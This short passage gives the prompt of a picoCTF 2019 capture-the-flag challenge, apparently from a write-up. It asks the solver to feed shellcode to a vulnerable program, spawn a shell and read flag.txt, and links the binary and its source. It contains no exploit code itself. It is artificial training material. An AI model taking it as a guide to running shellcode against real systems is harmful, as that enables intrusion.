## Question

This [program](https://2019shell1.picoctf.com/static/f5f38a3523dffd5f487719d1f35815a0/vuln) executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode\_1\_ebc60746fee43ae25c405fc75a234ef5 on the shell server. [Source](https://2019shell1.picoctf.com/static/f5f38a3523dffd5f487719d1f35815a0/vuln.c).
